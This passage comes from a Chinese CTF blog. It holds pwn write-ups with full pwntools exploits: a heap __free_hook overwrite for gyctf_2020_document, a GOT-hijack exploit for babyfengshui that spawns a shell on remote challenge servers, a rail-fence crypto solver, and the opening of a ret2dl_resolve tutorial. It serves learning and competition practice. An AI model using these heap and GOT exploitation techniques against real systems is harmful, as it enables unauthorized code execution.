bin</code>会进入smallbin，但是不影响，还是从上面切割下来作为第四组的小块。然后edit第0个块把这个块的指针改成<code>free_hook</code>。此时第四个堆块的指针被改成了<code>free_hook</code>，那么此时再edit 3为system即可。实际测试需要考虑它在读数据之后会写在那个指针偏移0x10的地方写数据，所以前面我们edit的时候也把它改成<code>free_hook</code>-0x10。最后edit 3 为system函数。由于这个输入是for() read(0,buf,1)读取的，因此0x70个字节必须写满，那边由于都是hook，我们都清空较为保险，因为万一不小心调用到了那边的hook很容易crash，那么exp根据以上思路很容易得到了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;node4.buuoj.cn&#x27;,26476)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">def add(name,sex,payload):#8,1,0x70</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;name&#x27;,name)</span><br><span class="line">    p.sendafter(b&#x27;sex&#x27;,sex,timeout=0.01)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line">def edit(index,sex,payload):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line">    if sex:p.sendlineafter(b&#x27;?&#x27;,b&#x27;Y&#x27;)</span><br><span class="line">    else:p.sendlineafter(b&#x27;?&#x27;,&#x27;N&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(0,&#x27;./gyctf_2020_document&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;a&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;b&#x27;*0x70)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\0&#x27;))-88-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">success(&#x27;libc:&#x27;+hex(libc_addr))</span><br><span class="line">success(&#x27;free_hook&#x27;+hex(libc_addr+libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;c&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;d&#x27;*0x70)</span><br><span class="line">edit(0,0,b&#x27;d&#x27;*0x10+p64(libc_addr+libc.sym[&#x27;__free_hook&#x27;]-0x10)+b&#x27;d&#x27;*0x58)</span><br><span class="line">edit(3,0,p64(libc_addr+libc.sym[&#x27;system&#x27;])+b&#x27;e&#x27;*0x68)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2021/10/26/gyctf_2020_document/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021浙江省预赛</title>
      <link href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/"/>
      <url>/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。</p><span id="more"></span><h2 id="比赛情况总结"><a href="#比赛情况总结" class="headerlink" title="比赛情况总结"></a>比赛情况总结</h2><p>我，学姐，学长分别出一题，最终得分350，排名在42。而我是出了一道密码题，pwn题没出，因为pwn题一道shellcode题当时分析没有考虑\0截断的这个特性，以为所有shellcode都要满足这个特性，觉得手撕汇编撕不过，就放弃了，没想到竟是一个\0绕过，这波，属实大意了闪了。</p><h2 id="部分题目writeup"><a href="#部分题目writeup" class="headerlink" title="部分题目writeup"></a>部分题目writeup</h2><h3 id="Crypto-Easy-Railfence"><a href="#Crypto-Easy-Railfence" class="headerlink" title="Crypto-Easy Railfence"></a>Crypto-Easy Railfence</h3><p>观察加密方式，发现这个加密只进行了位置对换，并且开头特意提醒flag的形式为 flag{} ，那么先根据 已有长度写出参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>现在Rail和offset不确定，但是 flag的格式确定，因此对参数进行爆破，然后观察发现l和g还有{}在整个 给的加密结果中只有一个并且位置已经确定，那么根据这个特性写出如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encrypt函数将结尾的print (d)改成了return d</span></span><br><span class="line"><span class="keyword">for</span> Rail <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> Offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(m, Rail , Offset)[<span class="number">23</span>:<span class="number">25</span>]==<span class="string">&#x27;&#125;l&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(Rail,Offset)</span><br></pre></td></tr></table></figure><p>得到两个结果 13 5和13 29，填充位位数多了应该有一定的规律，因此offset取5即可。</p><p> 由于这个加密方式只交换位置，因此我在某一位多的一个字符必然会在另一个位置一模一样的出现，将 已匹配的字符数作为该为有没有匹配的条件逐位爆破即可，以下为完整脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target=<span class="string">&#x27;reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">c,rails,offset</span>):</span></span><br><span class="line">    c = <span class="string">&#x27;$&#x27;</span> * offset + c</span><br><span class="line">    length = <span class="built_in">len</span>(c)</span><br><span class="line">    result = &#123;x: <span class="string">&quot;&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rails)&#125;</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        width = rails * <span class="number">2</span> - <span class="number">2</span></span><br><span class="line">        num = a % width</span><br><span class="line">        <span class="keyword">if</span> (num &lt; rails):</span><br><span class="line">            result.update(&#123;num: result[num] + c[a]&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ll = <span class="number">2</span> * rails - <span class="number">2</span> - num</span><br><span class="line">            result.update(&#123;ll: result[ll] + c[a]&#125;)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(rails):</span><br><span class="line">        d = d + result[k]</span><br><span class="line">    d = d.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span class="params">str1,str2</span>):</span></span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span>(str1[i]==str2[i]):ans+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">Rail=<span class="number">13</span></span><br><span class="line">Offset=<span class="number">5</span></span><br><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for Rail in range(2,20):</span></span><br><span class="line"><span class="string">    for Offset in range(0,30):</span></span><br><span class="line"><span class="string">        if encrypt(m, Rail , Offset)[23:25]==&#x27;&#125;l&#x27;:</span></span><br><span class="line"><span class="string">            print(Rail,Offset)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">63</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        m=m[:i]+<span class="built_in">chr</span>(j)+m[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> compare(target,encrypt(m, Rail , Offset))==i+<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/1.png" alt="1"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=&#125;</span><br></pre></td></tr></table></figure><p>再放工具md5即可。</p><p>可能是固定的算法思维吧，就只想到这个，忘了有工具这种东西了。参数解出来放在CyberChef中可以直接一把梭。</p><h3 id="pwn-sx"><a href="#pwn-sx" class="headerlink" title="pwn-sx"></a>pwn-sx</h3><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/2.png" alt="2"></p><p>分析文件是一道shellcode 题目，然后输入的shellcode经过传参到这个函数来判断是否合法，我以为都要满足，然后小算了一下发现限制很多，分组限制，当时我挺绝望的，想着这谁能做啊。可是结束之后我才想到可以\0字节绕过判断后面直接跟上shellcode ，只要保证前面能正确执行指令满足那些条件就可以。这里需要用到CyberChef工具中的disassemble，可以直接根据字节码转出来汇编指令，只要执行不产生异常，不让它指令偏移那就都可以放上来。</p><p>小算一波，发现下标%3=0的字节只能在[0xc0-0xff]范围内，%3=1和%3=2的则在0x80-0xbf的范围内。那就一个个指令尝试过去，最后发现一个很合适的。</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/3.png" alt="3"></p><p>执行完之后刚好能在最后一个00字节之后，后面填上shellcode直接打就结束了，下面附上本地运行结果。</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/4.png" alt="4"></p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/5.png" alt="5"></p><p>经过本次比赛，也意识到自己的不足应该是这些基础知识，算法优势应当好好利用起来去破密码试试看。总之，初赛过去，就得看向决赛了，争取在决赛上能一鸣惊人，加油！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>babyfengshui_33c3_2016 writeup</title>
      <link href="/2021/08/15/babyfengshui_33c3_2016%20writeup/"/>
      <url>/2021/08/15/babyfengshui_33c3_2016%20writeup/</url>
      
        <content type="html"><![CDATA[<p>好久没有更新博客了，因为作者太懒了，又懒又菜，今天来康康这道题，buuoj的<a href="https://buuoj.cn/challenges#babyfengshui_33c3_2016">babyfengshui_33c3_2016</a></p><span id="more"></span><h2 id="分析elf文件"><a href="#分析elf文件" class="headerlink" title="分析elf文件"></a>分析elf文件</h2><p>checksec一下发现canary保护和NX保护，got表没有保护，且随即地址没有开启。这就意味着got表可写，拖到IDA当中发现是一个经典的堆菜单题，以我现在的水平，那就是先分析它free后指针有无清零。本来一开始看它free了两个堆块，确指将一个指针清零了，以为是有uaf漏洞，但是后面发现不是这样的，它每一条目分一个name和对应的description，name且dscription是用指针指示，并且每个条目固定是80字节的大小，因此可以把一个条目看成一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x7c</span>];</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以，我把整个结构体free了之后就相当于把这个description的指针清零了，因此本题不存在uaf漏洞。再观察添加一个项目的函数，发现name是固定长度输入，且用了fgets函数限定输入0x7c字节，整个name那就是不可能溢出了，就连off by null漏洞都不存在。那么这样的话只能看看edit函数了，edit函数它在之前if也会有一个长度输入，并且用了下面这一句if判断，如果为真就直接退出系统</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="keyword">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )</span><br></pre></td></tr></table></figure><p>它这个是什么意思呢，翻译成c语言大概就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">heap *item</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(item-&gt;description+length&gt;=item<span class="number">-4</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它们的地址之差小于输入的长度，那就退出，如果长度溢出到那个结构体堆块的metadata，那就退出。</p><p>看似这个也不能溢出，但是实际上这个能用一个方法绕过。因为如果我们直接分配堆块的话，它们物理地址是相邻的，但是如果它们不物理相邻，中间隔了一个堆块，那就可以任意溢出中间的堆块了。并且got表可写，我们是通过指针找到description的，如果把它溢出改成got表的地址，那么在edit的时候就可以修改got表的条目了。那么我们修改哪个？把free改成system，那么在free(item-&gt;description)的时候就会变成system(item-&gt;description)，如果把item-&gt;description的内容改成”/bin/sh”，那么就可以愉快的getshell了。</p><p>这便是分析elf文件得到的信息。</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>先构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>这里需要特别注意add函数，它有两个长度输入，一个是description的堆块大小，一个是description内容的长度大小。这个name其实没必要弄，因为利用不到，但是我还是弄了。</p><p>首先添加两个0x80大小description的堆块，这样得到了两个0x80和0x88的大堆块。free掉第一个堆块，因为都不属于fastbin范围的堆块，那么就会合并成0x108大小的堆块，那么接下来如果我再申请一个0x100大小的description就会得到这个free的堆块，那么就可以在这个堆块上溢出第二个堆块了。</p><p>下面是我的完整exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">elf,p=conn(<span class="number">0</span>,<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#add(b&#x27;a&#x27;,0x80,0x80,b&#x27;a&#x27;*0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\0&#x27;</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10c</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x89</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0x81</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&#x27;free_addr&#x27;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr=free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_resolve</title>
      <link href="/2021/07/19/ret2dl_resolve/"/>
      <url>/2021/07/19/ret2dl_resolve/</url>
      
        <content type="html"><![CDATA[<p>有这么一个漏洞，他能在程序不提供任何输出函数的情况下执行<code>system(&quot;/bin/sh&quot;)</code>，没错，他就是<code>ret2dl_resolve</code>，这个我也认为是栈溢出的最后一关了，因此我现在就算是栈溢出毕业了吧hhhh。</p><span id="more"></span><p><code>elf</code>文件我们自给自足，自己编译，为了一步一步演示，还是给了一个输出函数，但是我们不通过这个输出函数去泄露<code>libc</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to the last stackoverflow&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span 